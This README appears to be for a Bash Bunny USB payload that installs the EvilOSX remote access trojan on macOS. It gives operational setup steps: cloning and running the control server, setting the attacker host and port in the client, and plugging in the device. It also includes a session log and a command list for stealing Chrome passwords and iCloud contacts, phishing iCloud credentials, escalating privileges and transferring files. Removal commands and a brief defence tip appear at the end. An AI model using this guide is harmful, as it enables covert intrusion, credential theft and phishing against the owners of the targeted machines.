# untitled_EVILOSX

````
 +  ______       _  _   ____    _____ __   __ 
 + |  ____|     (_)| | / __ \  / ____|\ \ / /
 + | |__ __   __ _ | || |  | || (___   \ V / 
 + |  __|\ \ / /| || || |  | | \___ \   > <  
 + | |____\ V / | || || |__| | ____) | / . \ 
 + |______|\_/  |_||_| \____/ |_____/ /_/ \_\\
 + untitled_ bash bunny edition    /   stekole
`````

** Disclaimer: This RAT is for research purposes only, and should only be used on authorized systems. ** 
** Accessing a computer system or network without authorization or explicit permission is illegal. **


## Features
 * Client reconnects automatically/persistence 
 * ECM_ETHERNET and HID attack
 * Emulate a simple terminal instance.
 * Sockets are encrypted with CSR via OpenSSL.
 * No dependencies (pure python).
 * Retrieve Chrome passwords.
 * Retrieve iCloud contacts.
 * Attempt to get iCloud password via phishing.
 * Show local iOS backups.
 * Download and upload files.
 * Retrieve find my iphone devices.
 * Attempt to get root via local privilege escalation (<= 10.10.5).
 * Auto installer


## Configuration


### Server

 To prep your server you will need to download and follow the install instructions from EVILOSX. 
 
 On your server, download the EvilOSX code and run your server. 
  ````
      git clone https://github.com/Marten4n6/EvilOSX.git && cd EvilOSX
      ./Server 
  ````
and type your listening port (1337)

### Client

Before you deploy your bash bunny, update your configuration in the EvilOSX.py file

At the bottom of the file you will see a server and port variable 

Set these to your server IP and listening port

````
  #########################
  SERVER_HOST = "10.99.99.16"
  SERVER_PORT = 1337
  #########################
````


## Usage

Plug in your bash bunny and wait until the script has finished running. 

You should see the client connect to the server

````
root@kali:~/git/EvilOSX# ./Server.py 
  ______       _  _   ____    _____ __   __
 |  ____|     (_)| | / __ \  / ____|\ \ / /
 | |__ __   __ _ | || |  | || (___   \ V / 
 |  __|\ \ / /| || || |  | | \___ \   > <  
 | |____\ V / | || || |__| | ____) | / . \ 
 |______|\_/  |_||_| \____/ |_____/ /_/ \_\
 
[?] Port to listen on: 1337
[I] Type "help" to get a list of available commands.
> help
help              -  Show this help menu.
status            -  Show debug information.
clients           -  Show a list of clients.
connect <ID>      -  Connect to the client.
exit              -  Close the server and exit.
> clients
[I] 1 client(s) available:
    0 = client_hostname
> connect 0
[I] Connected to "client_hostname", ready to send commands.
````


Some of the other features can be found in the help menu. I have not tried them all

````
help              -  Show this help menu.
status            -  Show debug information.
clients           -  Show a list of clients.
connect <ID>      -  Connect to the client.
get_info          -  Show basic information about the client.
get_root          -  Attempt to get root via local privilege escalation.
download <path>   -  Downloads the file to the local machine.
upload <path>     -  Uploads the file to the remote machine.
chrome_passwords  -  Retrieve Chrome passwords.
icloud_contacts   -  Retrieve iCloud contacts.
icloud_phish      -  Attempt to get iCloud password via phishing.
itunes_backups    -  Show the user's local iOS backups.
find_my_iphone    -  Retrieve find my iphone devices.
screenshot        -  Takes a screenshot of the client.
kill_client       -  Brutally kill the client (removes the server).
exit              -  Exits the session.
Any other command will be executed on the connected client.
````

## Removal of Tool

The file gets added to the following directory - and startup file is added to the LaunchAgents directory
````
rm -rf ~/Library/Containers/.EvilOSX/
launchctl unload ~/Library/LaunchAgents/com.apple.EvilOSX.plist && rm -rf ~/Library/LaunchAgents/com.apple.EvilOSX.plist
````

## Defence 
 * disable the command-space short key for spotlight or disable spotlight all together if not needed

## Todo

## Issues
 * I ran into a few issues with the "Build" of the python script.
 If the default one in this payload doesnt work, regenerate a new EvilOSX.py
 
 Run ./BUILDER and enter the appropriate information: 
 

 ![](http://i.imgur.com/NQRPFXS.png)

After, copy this to your switch payload

## Thanks
* [@Marten4n6](https://github.com/Marten4n6/EvilOSX)
* [YOURMOM](Check my room)
